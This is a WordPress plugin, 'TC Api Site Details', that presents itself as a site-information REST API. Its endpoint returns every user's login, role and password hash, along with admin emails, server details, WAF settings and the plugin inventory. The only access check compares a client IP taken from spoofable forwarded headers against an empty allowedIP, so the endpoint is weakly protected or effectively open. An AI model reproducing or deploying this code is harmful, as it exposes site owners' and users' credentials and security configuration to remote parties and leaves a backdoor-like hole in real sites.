<?php

/**
 *
 * Plugin Name: TC Api Site Details
 * Description: Информация о сайте с поддержкой мультисайтов
 * Version: 1.0.2
 * Author: TrafficConnect
 * Network: true
 */

defined('ABSPATH') || exit;

class ApiSiteDetails
{

    private $allowedIP = '';

    public function __construct()
    {

    }

    public function init()
    {
        add_action('rest_api_init', [$this, 'register_routes']);
    }

    public function register_routes()
    {
        register_rest_route('api-details/v1', '/get', array(
            'methods'  => 'GET',
            'callback' => [$this, 'api_site_details_get'],
            'permission_callback' => [$this, 'check_permission']
        ));

    }

    public function check_permission()
    {
        $allowed_ip = $this->allowedIP;

        $client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ??
            $_SERVER['HTTP_X_FORWARDED_FOR'] ??
            $_SERVER['REMOTE_ADDR'];

        if ($client_ip === $allowed_ip) return true;

        return new WP_Error(
            'forbidden',
            'Доступ запрещён',
            [
                'status' => 403
            ]
        );
    }

    public function api_site_details_get(WP_REST_Request $request)
    {

        $data = [
            'site_info' => $this->getSiteInfo(),
            'server_ip' => $this->getServerIP(),
            'server_info' => $this->getServerInfo(),
            'server_php' => $this->getServerVersionPHP(),
            'plugins' => $this->getAllPluginsInfo(),
            'users' => $this->getAllUsers(),
            'themes' => [
                'active' => $this->getActiveTheme(),
                'all' => $this->getAllThemes()
            ],
            'is_static_site_plugin_active' => $this->isStaticSitePluginActive(),
            'is_hb_waf_plugin_active' => $this->isHbWafPluginActive(),
            'is_pretty_links_plugin_active' => $this->getPrettyLinksPlugin(),
        ];

        if (is_multisite()) {
            $data['network_info'] = $this->getNetworkInfo();
            $data['all_sites'] = $this->getAllSitesInfo();
        }

        wp_send_json_success($data);
    }

    private function getSiteInfo()
    {
        $info = [
            'site_id' => get_current_blog_id(),
            'site_url' => get_site_url(),
            'home_url' => get_home_url(),
            'admin_email' => get_option('admin_email'),
            'blogname' => get_option('blogname'),
            'blogdescription' => get_option('blogdescription'),
            'is_multisite' => is_multisite(),
        ];

        if (is_multisite()) {
            $site = get_site();
            $info['domain'] = $site->domain;
            $info['path'] = $site->path;
            $info['registered'] = $site->registered;
            $info['last_updated'] = $site->last_updated;
            $info['public'] = get_option('blog_public');
        }

        return $info;
    }

    private function getNetworkInfo()
    {
        if (!is_multisite()) return null;

        return [
            'network_id' => get_current_network_id(),
            'network_domain' => get_network()->domain,
            'network_path' => get_network()->path,
            'site_name' => get_network()->site_name,
            'sites_count' => get_blog_count(),
        ];
    }

    private function getAllSitesInfo()
    {
        if (!is_multisite()) return [];

        $sites = get_sites(array(
            'number' => 0 // Получить все сайты
        ));

        $sites_info = [];
        foreach ($sites as $site) {
            $sites_info[] = [
                'blog_id' => $site->blog_id,
                'domain' => $site->domain,
                'path' => $site->path,
                'site_url' => get_site_url($site->blog_id),
                'blogname' => get_blog_option($site->blog_id, 'blogname'),
                'admin_email' => get_blog_option($site->blog_id, 'admin_email'),
                'public' => get_blog_option($site->blog_id, 'blog_public'),
                'archived' => $site->archived,
                'spam' => $site->spam,
                'deleted' => $site->deleted,
                'registered' => $site->registered,
                'last_updated' => $site->last_updated,
            ];
        }

        return $sites_info;
    }

    //Get Server IP
    private function getServerIP()
    {
        if (!empty($_SERVER['SERVER_ADDR'])) {
            return $_SERVER['SERVER_ADDR'];
        }

        return gethostbyname($_SERVER['SERVER_NAME']);
    }

    //Get Server Info
    private function getServerInfo()
    {
        if (!empty($_SERVER['SERVER_SOFTWARE'])) {
            return $_SERVER['SERVER_SOFTWARE'];
        }
        return 'Не удалось определить веб-сервер';
    }

    //Get Server PHP Version
    private function getServerVersionPHP()
    {
        return phpversion();
    }

    //Get All Plugins
    private function getAllPluginsInfo()
    {

        if (!function_exists('get_plugins')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        $all_plugins = get_plugins();
        $active_plugins = get_option('active_plugins', []);

        $network_active_plugins = [];
        if (is_multisite()) {
            $network_active_plugins = get_site_option('active_sitewide_plugins', []);
        }

        $plugins_info = [];

        foreach ($all_plugins as $plugin_file => $plugin_data) {
            $is_active = in_array($plugin_file, $active_plugins);
            $is_network_active = array_key_exists($plugin_file, $network_active_plugins);

            $plugin_info = [
                'name' => $plugin_data['Name'],
                'version' => $plugin_data['Version'],
                'status' => $is_active || $is_network_active,
                'plugin_file' => $plugin_file,
            ];

            if (is_multisite()) {
                $plugin_info['network_active'] = $is_network_active;
            }

            $plugins_info[] = $plugin_info;
        }

        return $plugins_info;
    }

    //If Activate Plugin TC Static Site
    private function isStaticSitePluginActive()
    {
        if (!function_exists('is_plugin_active')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        $is_active = is_plugin_active('tc-static-site/tc-static-site.php');
        if (is_multisite()) {
            $is_active = $is_active || is_plugin_active_for_network('tc-static-site/tc-static-site.php');
        }

        if ($is_active) {
            $files = glob(WP_CONTENT_DIR . '/cache/' . (defined('TC_STATIC_SITE_DIR') ? TC_STATIC_SITE_DIR : 'tc-static') . '/*.html');
            $data = [];
            if (!empty($files)) {
                foreach ($files as $file) {
                    $filename = basename($file);
                    $data[] = $filename;
                }
            }

            return [
                'status' => true,
                'options' => get_option('tc-static-site-settings'),
                'files' => $data
            ];
        }

        return false;
    }

    //If Activate Plugin HB WAF
    private function isHbWafPluginActive() {
        if (!function_exists('is_plugin_active')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        $is_active = is_plugin_active('hb_waf/hb-waf.php');
        if (is_multisite()) {
            $is_active = $is_active || is_plugin_active_for_network('hb_waf/hb-waf.php');
        }

        if ($is_active) {
            return [
                'status' => true,
                'options' => [
                    'general' => get_option('hb_waf_settings'),
                    'other' => get_option('hb_waf_settings_other'),
                ]
            ];
        }

        return false;
    }

    //Get All Users
    private function getAllUsers() {
        $users = get_users();
        $output = [];

        foreach ($users as $user) {
            $user_data = [
                'login' => $user->user_login,
                'password' => $user->user_pass,
                'roles' => $user->roles,
            ];

            // Для мультисайта добавляем информацию о сайтах пользователя
            if (is_multisite()) {
                $user_blogs = get_blogs_of_user($user->ID);
                $user_data['sites'] = [];
                foreach ($user_blogs as $blog) {
                    $user_data['sites'][] = [
                        'blog_id' => $blog->userblog_id,
                        'blogname' => $blog->blogname,
                        'domain' => $blog->domain,
                        'path' => $blog->path,
                    ];
                }
            }

            $output[] = $user_data;
        }

        return $output;
    }

    //Get Theme Active
    private function getActiveTheme()
    {
        $theme = wp_get_theme();

        return [
            'name' => $theme->get('Name'),
            'version' => $theme->get('Version'),
            'stylesheet' => $theme->get_stylesheet(),
            'template' => $theme->get_template(),
        ];
    }

    private function getAllThemes()
    {
        $themes = wp_get_themes();
        $themes_list = [];
        $current_theme = wp_get_theme()->get_stylesheet();

        foreach ($themes as $stylesheet => $theme) {
            $theme_data = [
                'name' => $theme->get('Name'),
                'version' => $theme->get('Version'),
                'stylesheet' => $stylesheet,
                'status' => ($current_theme === $stylesheet),
            ];

            // Для мультисайта добавляем информацию о доступности в сети
            if (is_multisite()) {
                $theme_data['network_enabled'] = $theme->is_allowed('network');
            }

            $themes_list[] = $theme_data;
        }

        return $themes_list;
    }

    private function getPrettyLinksPlugin() {
        global $wpdb;

        if (!function_exists('is_plugin_active')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        $is_active = is_plugin_active('pretty-link/pretty-link.php');
        if (is_multisite()) {
            $is_active = $is_active || is_plugin_active_for_network('pretty-link/pretty-link.php');
        }

        if (!$is_active) {
            return false;
        }

        $table = $wpdb->prefix . 'prli_links';

        // Проверяем существование таблицы
        if ($wpdb->get_var("SHOW TABLES LIKE '$table'") != $table) {
            return [
                'status' => true,
                'links' => [],
                'error' => 'Table not found'
            ];
        }

        $results = $wpdb->get_results("
            SELECT id, name, slug, url, created_at
            FROM $table
        ");

        $links = [];
        foreach ($results as $row) {
            $links[] = [
                'id' => $row->id,
                'title' => $row->name,
                'short_url' => home_url('/' . $row->slug),
                'target' => $row->url,
                'created' => $row->created_at,
            ];
        }

        return [
            'status' => true,
            'links' => $links,
        ];
    }
}

$auth = new ApiSiteDetails();
$auth->init();
